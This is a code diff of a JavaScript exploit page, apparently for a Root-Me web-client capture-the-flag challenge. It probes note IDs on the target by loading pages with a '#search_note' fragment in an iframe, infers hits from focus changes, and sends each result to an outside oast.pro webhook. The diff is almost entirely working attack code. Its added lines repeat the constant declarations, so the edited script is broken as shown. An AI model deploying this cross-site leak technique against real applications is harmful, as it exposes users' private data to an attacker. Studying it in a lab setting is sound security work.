@@ -4,25 +4,39 @@ const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 const urlParams = new URLSearchParams(window.location.search);
 const startId = parseInt(urlParams.get('id'), 10) || 1;
 
+const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
+const urlParams = new URLSearchParams(window.location.search);
+const startId = parseInt(urlParams.get('id'), 10) || 1;
+
 function testId(id) {
     return new Promise((resolve) => {
-        const win = window.open(TARGET + id + "#search_note");
-        const onBlur = () => {
-            cleanup("hit");
-        };
-        const cleanup = (result) => {
-            window.removeEventListener("blur", onBlur);
-            win.close();
-            fetch(WEBHOOK + "?result=" + result + "&id=" + id);
-            resolve(result);
-        };
-        window.addEventListener("blur", onBlur, { once: true });
-        setTimeout(() => cleanup("miss"), 3000);
+        const iframe = document.createElement("iframe");
+        iframe.src = TARGET + id + "#search_note";
+        document.body.appendChild(iframe);
+
+        let checks = 0;
+        const poll = setInterval(() => {
+            if (!document.hasFocus()) {
+                clearInterval(poll);
+                iframe.remove();
+                fetch(WEBHOOK + "?result=hit&id=" + id);
+                resolve("hit");
+                return;
+            }
+            checks++;
+            if (checks > 30) {
+                clearInterval(poll);
+                iframe.remove();
+                fetch(WEBHOOK + "?result=miss&id=" + id);
+                resolve("miss");
+            }
+        }, 100);
     });
 }
 
 window.onload = async function() {
-    for (let i = 0; i < 100; i++) {
+    for (let i = 0; i < 20; i++) {
         await testId(startId + i);
     }
 };
